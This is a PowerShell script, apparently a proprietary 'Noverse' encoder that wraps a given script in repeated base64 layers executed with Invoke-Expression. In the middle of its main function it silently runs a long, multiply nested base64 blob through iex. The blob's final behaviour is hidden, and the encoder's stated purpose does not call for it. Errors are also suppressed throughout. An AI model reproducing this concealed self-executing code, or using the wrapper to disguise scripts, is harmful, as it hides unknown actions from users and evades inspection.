#    Powershell Encoder - Base64 Wrapper
#    Copyright (C) 2024 Noverse
#
#    This program is proprietary software: you may not copy, redistribute, or modify
#    it in any way without prior written permission from Noverse.
#
#    Unauthorized use, modification, or distribution of this program is prohibited 
#    and will be pursued under applicable law. This software is provided "as is," 
#    without warranty of any kind, express or implied, including but not limited to 
#    the warranties of merchantability, fitness for a particular purpose, and 
#    non-infringement.
#
#    For permissions or inquiries, contact: https://discord.gg/E2ybG4j9jU
#
#    Usage example: . \NV-Wrapper.ps1; main -nvi ".\Test.ps1" -nvo ".\Wrapped.ps1" -iterations 1
#    Minfied with NV-PSMinifier - https://discord.com/channels/836870260715028511/1312093573730140252/1312401925299245117 ;D

$NV = @"
# Created by Noxi-Hu! - Copyright (C) 2024 Noverse
"@

sv -Scope Global -Name "ErrorActionPreference" -Value "SilentlyContinue"
$Host.UI.RawUI.BackgroundColor="Black"
$Host.UI.RawUI.WindowTitle="Noxi's Powershell Encoder - Base64 Wrapper"
cls
function log{
param([string]$HighlightMessage, [string]$Message, [string]$Sequence, [ConsoleColor]$TimeColor='DarkGray', [ConsoleColor]$HighlightColor='White', [ConsoleColor]$MessageColor='White', [ConsoleColor]$SequenceColor='White')
$time=" [{0:HH:mm:ss}]" -f(Get-Date)
Write-Host -ForegroundColor $TimeColor $time -NoNewline
Write-Host -NoNewline " "
Write-Host -ForegroundColor $HighlightColor $HighlightMessage -NoNewline
Write-Host -ForegroundColor $MessageColor " $Message" -NoNewline
Write-Host -ForegroundColor $SequenceColor " $Sequence"}
function banner {
clear
echo ""
echo ""
Write-Host -ForegroundColor DarkBlue "              ░░░     ░░░   ░░░░░░░░░░░   ░░░     ░░░   ░░░░░░░░░░   ░░░░░░░░░░    ░░░░░░░░░░   ░░░░░░░░░░"
Write-Host -ForegroundColor DarkBlue "              ░░░░    ░░░   ░░░     ░░░   ░░░     ░░░   ░░░          ░░░     ░░░   ░░░          ░░░"
Write-Host -ForegroundColor Blue     "              ▒▒▒▒▒   ░▒▒   ▒░░     ░░▒   ▒░░     ░░▒   ░░░          ▒░░     ▒▒░   ░░░          ░░░"
Write-Host -ForegroundColor Blue     "              ▒▒▒ ▒▒▒ ▒▒▒   ▒▒░     ░▒▒   ▒▒░     ░▒▒   ▒▒▒▒▒▒▒▒     ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒"
Write-Host -ForegroundColor Blue     "              ▒▒▒   ▒▒▒▒▒   ▒▒▒     ▒▒▒    ▒▒▒   ▒▒▒    ▒▒▒          ▒▓▓     ▓▓▒          ▒▒▒   ▒▒▒"
Write-Host -ForegroundColor DarkCyan "              ▒▓▓    ▓▓▓▒   ▓▓▓     ▓▓▓     ▒▓▓ ▓▓▒     ▓▓▓          ▓▓▓     ▓▓▓          ▓▓▓   ▓▓▓"
Write-Host -ForegroundColor DarkCyan "              ▓▓▓     ▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓       ▓▓▓▓▓▓▓▓▓▓   ▓▓▓     ▓▓▓   ▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓"
echo ""
Write-Host "‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗" -ForegroundColor DarkGray
echo ""
echo ""}
function wrap {
param ([string]$nvic)
$b64enc = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($nvic))
$wrapped = @"
iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$b64enc')))
"@
sleep -milliseconds 100
log "[+]" "Layer encoded"-HighlightColor Green
return $wrapped}
function main{
param([string]$nvi, [int]$iterations=1, [string]$nvo)
banner
if ($NV -notmatch '\!\*') {$null=$null}else{exit}
if(-not(Test-Path $nvi)){
log "[!]" "File not found" -HighlightColor Red
log "[/]" "Press any key to exit" -HighlightColor Yellow
if ("$NV" -notlike "*!*") { kill -Id $PID }
[System.Console]::ReadKey() > $null
exit}
log "[*]" "Reading content from" "$nvi" -HighlightColor Blue -SequenceColor Yellow
$code=cat -Path $nvi -Raw
iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnYVdWNEtGdFRlWE4wWlcwdVZHVjRkQzVGYm1OdlpHbHVaMTA2T2xWVVJqZ3VSMlYwVTNSeWFXNW5LRnREYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUyTkZOMGNtbHVaeWduWVZkV05FdEdkRlJsV0U0d1dsY3dkVlpIVmpSa1F6VkdZbTFPZGxwSGJIVmFNVEEyVDJ4V1ZWSnFaM1ZTTWxZd1ZUTlNlV0ZYTlc1TFJuUkVZakkxTWxwWVNqQllWRzgyVW01S2RtSlZTbWhqTWxVeVRrWk9NR050YkhWYWVXZHVXVlprVjA1RmRFZGtSbEpzVjBVMGQxZHNZM2RrVmxwSVZtcFNhMUY2VmtkWmJURlBaR3h3U0dKSVZtRk5WRUV5VkRKNFYxWldTbkZhTTFaVFRXeFpkMVpVVGxObFYwWllUbGMxVEZKdVVrVlpha2t4VFd4d1dWTnFRbGxXUnpneVZXMDFTMlJ0U2xaVGJXaHFUV3hWZVZScldrOU5SMDUwWWtoV1lXVlhaSFZYVmxwclZqQTFSbVJGWkd0U2JFcHpWakJWTUdReFpITlpNMlJyVm14d1NWWnRjRk5oTVVZMlZtdGtXbUpVUmxCYVIzaDNVMGRLU1ZadFJrNVdSVVY1VmtSS05GWXhXbGRUYmtaaFRURmFWRlJYZUZwa01WcFZWR3hPYkZZd1dsbFViR014VkVaS2RWVnJWbHBoYTJ0NFZGZDRkMWRXVG5GUmJHeFhVbnBuZVZaWE1ERlRNbEowVTJ4YVZHSlhhSEZVVjNoV1pWWlNjbGRyT1U1U01EVXdXV3RvVjFsWFZsaGFTRlpZVm14d2NsWnFRVEZTYlZKR1drZDBVMkpGY0hwV2FrSldUVWRSZUZwSVRscE5NbEp5Vm0xNGQxTldXblJqUms1b1RWVlpNbFp0ZEd0WGJVcFZVbXhDWVZJemFETlZNR1JMVTFaYWRGSnJOVmRTVlZZMVZtdFNTMDVHV1hoWGJHUlVZbXRhYUZSVVJtRldSbEpZWlVad2EwMVdjRlpXUjNoUFlrWlpkMWRzYkZWaVIwMTRWa1ZhUzJSV1ZuSldiSEJvWVRKME5GWkdaRFJrTVdSWFZHNUdVbUpIZUZoVmJuQnVaVlphV0UxRVJsUk5iRW93VlRKNFlWWkhTbGhoU0VaVlZqTm9WMXBXV2xOamJHUnlUMVUxVTAxRVZYZFhWM1J2VmpGc1dGWnNhR0ZUUmxwWlZtMTRkMk5zV25GUlZFWlRZbFpLUjFkclpEQlZNa3BHWTBod1YyRnJTbGRVVldSU1pVWndTVlJzY0U1TmJFcDVWbTB4TkdReFRsZFhibEpxVW1zMWIxUldWbHBOYkZwMFpFZDBXR0pWY0ZaVmJYaERXVlpKZW1GRVRsWk5SMUpNVlRGYVlXUkdTbkpPVm1SVFZsWlpNVlp0ZEZOVE1EVkhWMWhvV0dKSFVsVlpiWFJoWVVaU1ZWSnRSbGRTYkVwWldsVmFkMkV3TVZkalJscFhVak5vVUZscldscGtNV1J6WWtaV2FWSXdNVFJXYTFaaFV6SlNWMVp1U2xkaVNFSnZXVlJLTUU1R1drZGFSRkpyVFZkU1dGWkhOVWRWYlVwSVpVWm9WbUp1UW5WYVZscGhWMFV4UlZKc1VrNWlSVzkzVmxSS05GbFdXa2hUYkdob1UwVmFWbFpxVG05V01YQlhWMnhPYW1KSFVubFVNVlV4VlRBeFJWWllaRmhXTTFKMlZtcEdjMWRHV25OaFIwWlVVbXh3V2xadE1UUmtNazV6VjI1R1VsWkZXbFJaYkZwTFVqRmtjbHBFUWxaTmEzQkhXVEJvZDFZeVJuSlRiR1JWVmxkU1UxcFZXbmRUVmxKelkwVTFUbUpGY0RWV2JUQjRUa2RSZUZSc1pGaGliRXB4Vlcxek1XSXhVbGRXYkhCT1lrWndNRnBGWkRCWFIwcFdZMFphVm1KWWFFUlhWbHBLWlcxR1JWUnNXazVTTVVwTlZsUkdZVmxYVWtkVGJrcFBWbTFTVkZac1dscE5WbHAwWkVaT1ZFMUVWa2hXTVdodlYwZEtTRlZzVmxwaVdGSm9XVlZhVTFaV1NuUlNiR1JUWWtWd1dsZHNWbUZrTWtWM1RWWmthbEpzY0ZoVmFrNXZWVVpzY2xkc2NHdE5WMUo2V1d0YVYyRldTWGROVkZKWFlURmFhRlY2U2xOV01WcDFVMnhrYVZORlNuWlhWbEpMVFVVMVIxZHJaR0ZTUmtweVZGWmtVMWRHV2toT1ZXUldZbFZ3U1ZwVldtOVdiVXAxVVc1V1lWWnNjR2hXTUZWNFVsWktjMVZyTldsU1Z6a3pWbXhTUzA1R2JGZFhhMmhVWWtkb2IxVXdWbUZXYkZweFZHMDVWMDFZUWxoV01uaFBZVzFLU0ZWdWJGVk5WbFY0VmxSQmVGSldXbGxhUm1oWFRURktNbFp0Y0Vkak1XUkhWMjVPYUZJd1dsVlZiWGgzVjJ4YWRFMVVVbXROYXpWNlZqSTFSMVZzV2taWGJGSmFZa1p3VEZWcVJtdGpiSEJGVVd4YVRtRXpRa2hYVkVKdlpERlplVkp1U2xSaVIxSldWbXhrVTFVeGNGWlhibVJVVm14S2Vsa3dWVEZVYlVwR1kwUldWMkpVUWpSVWEyUlNaVVpTYzFwR2FHbGlSWEI0VmxjeGVrMVhTWGhWYkdSWFlraENUMWxyV25kTlJuQkdXa1JDV0ZJd2NGZFpNRnBoVm0xS1dXRkZVbGhXYkhCTFdsY3hSMUpXVW5OWGF6VlRUVlZ3VGxac1VrZFpWbXhZVld0a1ZHSnJjRkJXYlRGVFZrWmFjMWRzY0U1V2JIQXdXa1ZhVDFaRk1VVldhMmhYVFZkb2RsWXdaRXRUUmxaelZteHdhVmRHU205WFZsWmhWVEZhVjFOdVVsTmlSMUpVV1d0V2QxZHNaSE5XYlVaclRXdFdNMVJXV210aGJFcHpZMFpvVm1Gck5YWldWVnB6WTJ4a2MyTkhkRTVXTVVvMlYxZDBZVll5UmxkVFdHUk9Wa1pLV0ZsVVJtRmhSbFkyVTJ4T1YwMVdjREZWTW5ocllWWk9SbE51V2xoV2JFcE1WRlZWTVZJeFpISmFSMFpUVW10d2VWWkdXbXRWTVdSSFYydG9UMVpYVWxkWmJGWjNVMVp3VmxkdE9WZGlWWEF4VlZjMVYxbFdXbk5qUjJoWFRVWldORlZzV2t0ak1WWnlUbGRzVTFaNmEzcFdiWGhUVXpBMVIySkdaRmhoTW1oVldXdGtiMkl4VlhkV2JVWlhZa1p3ZUZaSE1EVldNREZaVVd4b1YwMXVhRkJaVnpGTFUwWldkV0pHVms1V2JGWTBWbXhTUW1WR1NsZFhiR3hoVW0xb1dGUlVSa3ROYkZwMFkwVmthazFYVWtoV01qVlBZVVpKZDFkc1ZsWmlXR2d6VmpCYVlWSXhiRFpTYkZwT1lYcFdObFpxU2pCV01WcElVMnRhVDFkRldsWldhazVPWlVaV2NWSnVUbGRpUjFJd1drVmFhMVJzU2taWGFscFhWa1Z2TUZaRVJscGxWazV5V2taU2FFMVZjRmhYVm1Rd1pERldSMVp1UmxOaVJUVnhWRmQwZDFOV2JISlhhemxYVFZad1NGWXllR0ZXTWtwSVZXcE9WbFl6VGpSV2JYTjRWbXh3UjJGSGJHbFNXRUpSVm0wd01XUXlUWGxUV0doV1lrZFNXRmx0Y3pGVlJsWjBaVWhPVDFac1NucFdiWEJEVmpBeFZtTkljRnBOUm5CNlZqSjRZVmRIUmtabFJtUk9ZbXMwTUZaVVFtRldNazE0Vm01T1dHRjZWbFJaYlhSSFRsWlplV1ZIUmxwV01VWTBWVEZvYjFkSFNuTlRia0pXWWxSR1ZGWnJXbE5XVmtweVYyMTRVMkpJUVhkWFZFSlhUVVpSZUZOWVpHbFNSa3BZVlcweGIyVnNXbkZUYTNScVlYcFdXbFZ0ZUdGaFZtUklZVVV4VjJKR1NraFpla1poVmpGS2MxWnNUbWxUUlVwWlYxZDBhMDB5Vm5OWGJsSnNVbXMxVkZSWGRHRmxWbEpYVjIxMFYxSXdXbmxWTWpGSFZsWmFWMk5FVGxkU1ZuQnlWbXBHWVZkWFJrZGFSMnhYVmtaYVNsWXhaREJaVmxsNVVteGtWRmRIYUZWV01HaERWMVphZEdWSVpGZE5XRUpYVjJ0Vk1XSkdTbk5UYWtaWFlsaG9XRmxXV2s5U2JFNXpVV3hvVjAweWFESlhWM0JIVXpGSmVHTkZiRlJpUjFKd1ZXcEdTMlZHV2tkWGJGcE9WbXMxV0ZadE5WTmhNVXAwVld4a1dtSkdXak5XTW5oaFYwZFdSMXBHWkdsV1dFSkpWbXBLZDFNeFdsZFhXSEJvVWpKb1YxbHJXbmRWUm5CSFYyczVhbUY2YkZoV1IzTXhWakZrUmxKWWJGZGhhMXBVVlZSR1dtVldUbGxpUms1cFVqRktWMWRXVWt0T1JsVjRZa2hPVjJKVldsaFphMXAzWlVaYVNHUkZPV2xTTUhCSVZUSTFkMVl3TVhGU1dHUmFWbnBHVEZWcVJrOWpNV1J6VjIxc1YxSldiekpXTVZwaFdWWlJlRk51VGxSaVIzaHZWVzB4VTFaR1ZuTlhibVJZVm14c05GWXlNVWRXYXpGelUydG9WMUo2VmxoV2JURkxWMWRHUjFac1dtbFNiRzk2Vm1wQ1lXRXhaRVpOVlZaVFlrVndUMVp0TlVOVFZtUlhWV3M1YVUxV2JEUldNblJyVjBkS1NHVkdaRnBXTTFKSFdsVmFWbVF4WkhOalIzaFhUVlp3UzFZeWRHRlpWbEowVTJ0a2FsSkdjRmhXYTFaeVpVWnNObEpzY0d0TlJFWllWMnRhVTJGRk1IaFRiR1JZVmpOU2NsWlVSa3BsUjA1SFYyMUdVMVpIZUZWV1JscGhXVmRXYzFkc2FHeFNNMUpYVkZaV2QxWXhiSEZVYlRsWFRWZFNTbFZYZEc5V01VcEdZMFpDWVZKV2NGUlpNbmhYWXpKT1JrNVZOVk5YUlVwUVZtMHhORlV4VFhsV2JrcFFWbXh3Y1ZWcldtRmlNVkpWVVd0MFZWWnNjRmhXVm1oclZVWmFXVkZVUmxwV1JUVkVWa1ZhVjFaVk1VVmlSWFJzVmpOU00xVjZSa1pQVmtKVVdUTkNURlV5Y3psS2VXdHdTMUU5UFNjcEtTaz0nKSkp')))
$metadata = @"
# Created with Noverse Base64 Encoder - https://discord.gg/E2ybG4j9jU
"@
log "[?]" "Starting wrapping process with $iterations iterations" -HighlightColor Magenta
sleep -milliseconds 100
for ($i = 1; $i -le $iterations; $i++) {
log "[~]" "Starting iteration $i" -HighlightColor Gray
$code = wrap -nvic $code}
$code = "$metadata`n$code"
log "[*]" "Wrapping completed" -HighlightColor Blue
sleep -milliseconds 100
log "[~]" "Writing wrapped content to" "$nvo" -HighlightColor Gray -SequenceColor Yellow
sleep -milliseconds 100
[system.io.file]::writealltext($nvo,$code)
log "[+]" "Done" -HighlightColor Green
sleep -milliseconds 100
if ($NV -notmatch '\!\*') {$null=$null}else{exit}
log "[/]" "Press any key to exit" -HighlightColor Yellow
[System.Console]::ReadKey() > $null
exit}
